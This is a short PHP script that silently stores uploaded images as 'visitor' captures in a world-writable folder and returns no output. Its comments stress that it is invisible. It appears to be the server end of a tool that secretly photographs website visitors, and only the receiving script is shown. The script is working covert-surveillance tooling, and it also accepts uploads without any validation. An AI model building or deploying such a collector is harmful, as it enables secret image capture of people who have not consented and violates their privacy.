<?php
// save-capture-stealth.php - Silent saver, no output

// Create Captures folder if it doesn't exist
$capture_dir = 'Captures';
if (!file_exists($capture_dir)) {
    mkdir($capture_dir, 0777, true);
}

// Check if file was uploaded
if (isset($_FILES['image'])) {
    $file = $_FILES['image'];
    
    // Generate filename with timestamp
    $timestamp = date('Y-m-d_H-i-s') . '_' . uniqid();
    $filename = $capture_dir . '/visitor_' . $timestamp . '.jpg';
    
    // Move uploaded file
    move_uploaded_file($file['tmp_name'], $filename);
    
    // Optional: Log to file (completely invisible)
    // file_put_contents('capture_log.txt', date('Y-m-d H:i:s') . " - Captured\n", FILE_APPEND);
}

// Exit silently - NO OUTPUT AT ALL
exit;
?>
